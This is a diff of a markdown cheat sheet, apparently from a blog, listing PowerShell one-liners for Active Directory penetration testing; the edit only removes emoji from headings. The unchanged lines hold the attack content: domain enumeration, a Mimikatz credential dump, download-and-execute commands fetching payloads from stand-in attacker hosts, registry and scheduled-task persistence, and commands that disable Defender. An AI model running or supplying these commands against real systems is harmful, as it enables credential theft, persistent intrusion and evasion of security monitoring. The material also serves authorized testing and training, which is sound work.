@@ -9,7 +9,7 @@ image: /assets/images/Cyber-Security/Power-S-Hell.png
 
 This is a collection of PowerShell one-liners for **Active Directory (AD) pentesting**, including recon, enumeration, lateral movement, persistence, evasion, and payload delivery.
 
-## 🧾 PowerShell History File
+## PowerShell History File
 
 ```
 C:\Users\user01\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -17,7 +17,7 @@ C:\Users\user01\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleH
 
 Stored command history — often contains creds, recon, or tooling clues.
 
-## 🏷️ Whoami & Token Info
+## Whoami & Token Info
 
 ```powershell
 whoami /all
@@ -27,7 +27,7 @@ Get-ProcessTokenPrivilege
 
 View current user identity, privileges, and token info.
 
-## 🧠 Domain Info
+## Domain Info
 
 ```powershell
 (Get-WmiObject Win32_ComputerSystem).Domain
@@ -37,7 +37,7 @@ View current user identity, privileges, and token info.
 
 Get basic domain and forest information.
 
-## 🔍 User Enumeration
+## User Enumeration
 
 ```powershell
 Get-ADUser -Filter * -Properties DisplayName,Description | select Name,DisplayName,Description
@@ -46,7 +46,7 @@ net user /domain
 
 Enumerate domain users with additional context.
 
-## 🖥️ Computer Enumeration
+## Computer Enumeration
 
 ```powershell
 Get-ADComputer -Filter * | Select-Object Name,OperatingSystem,LastLogonDate
@@ -54,7 +54,7 @@ Get-ADComputer -Filter * | Select-Object Name,OperatingSystem,LastLogonDate
 
 List domain-joined systems with OS and last login info.
 
-## 🏠 Group Memberships
+## Group Memberships
 
 ```powershell
 net group "Domain Admins" /domain
@@ -63,7 +63,7 @@ Get-ADGroupMember "Domain Admins"
 
 Check domain admin members.
 
-## 🔐 Password Policy & Trusts
+## Password Policy & Trusts
 
 ```powershell
 (Get-ADDefaultDomainPasswordPolicy)
@@ -72,7 +72,7 @@ Get-ADTrust -Filter *
 
 Inspect domain password requirements and trust relationships.
 
-## 🔎 Current Session Info
+## Current Session Info
 
 ```powershell
 qwinsta
@@ -81,7 +81,7 @@ query user
 
 See who’s currently logged in.
 
-## 💻 Network Shares Discovery
+## Network Shares Discovery
 
 ```powershell
 net view /domain
@@ -91,7 +91,7 @@ Invoke-ShareFinder -Verbose
 
 Enumerate visible network shares.
 
-## 📁 Share Access Test
+## Share Access Test
 
 ```powershell
 Invoke-CheckLocalAdminAccess -ComputerName targethost
@@ -100,7 +100,7 @@ Invoke-SmbEnum -ComputerName targethost
 
 Check access rights and share contents remotely.
 
-## 🔓 Kerberoasting Candidates
+## Kerberoasting Candidates
 
 ```powershell
 Get-ADUser -Filter * -Properties ServicePrincipalName | Where-Object { $_.ServicePrincipalName -ne $null } | Select SamAccountName, ServicePrincipalName
@@ -108,7 +108,7 @@ Get-ADUser -Filter * -Properties ServicePrincipalName | Where-Object { $_.Servic
 
 Find SPN-enabled accounts for ticket extraction.
 
-## 📬 Mailbox Discovery
+## Mailbox Discovery
 
 ```powershell
 Get-ADUser -Filter * -Properties mail | Where-Object {$_.mail -ne $null} | Select Name, mail
@@ -116,7 +116,7 @@ Get-ADUser -Filter * -Properties mail | Where-Object {$_.mail -ne $null} | Selec
 
 List domain users with email addresses.
 
-## 🧠 BloodHound Ingestors (SharpHound)
+## BloodHound Ingestors (SharpHound)
 
 ```powershell
 Invoke-WebRequest -Uri http://<attacker>/SharpHound.exe -OutFile SharpHound.exe
@@ -125,7 +125,7 @@ Invoke-WebRequest -Uri http://<attacker>/SharpHound.exe -OutFile SharpHound.exe
 
 Collect AD data for analysis in BloodHound.
 
-## 🔑 Dump Hashes (if Admin)
+## Dump Hashes (if Admin)
 
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
@@ -133,7 +133,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
 
 Dump logon credentials from memory.
 
-## 🕵️‍♂️ DNS + Reverse Lookup
+## DNS + Reverse Lookup
 
 ```powershell
 Resolve-DnsName target.domain.local
@@ -142,7 +142,7 @@ Resolve-DnsName target.domain.local
 
 Identify IPs and names within the domain.
 
-## 📦 Remote Payload Execution
+## Remote Payload Execution
 
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
@@ -150,7 +150,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
 
 Load and run remote scripts in memory.
 
-## 🔀 Lateral Movement
+## Lateral Movement
 
 ```powershell
 Invoke-WMICommand -ComputerName target -Command "whoami"
@@ -161,7 +161,7 @@ Invoke-SMBExec -Target target -Command "ipconfig /all"
 
 Remotely execute commands or enter sessions.
 
-## 🧬 Persistence
+## Persistence
 
 ```powershell
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "powershell.exe -WindowStyle Hidden -Command 'IEX (New-Object Net.WebClient).DownloadString(`'http://attacker/payload.ps1`')'"
@@ -175,7 +175,7 @@ schtasks /create /tn "Updater" /tr "powershell -WindowStyle Hidden -ExecutionPol
 
 Create recurring scheduled task for persistence.
 
-## 🎭 Defender Evasion
+## Defender Evasion
 
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -185,7 +185,7 @@ powershell -exec bypass -w hidden -EncodedCommand <base64payload>
 
 Disable Defender and hide payload execution.
 
-## 💥 Custom Payload Execution
+## Custom Payload Execution
 
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/backdoor.ps1')
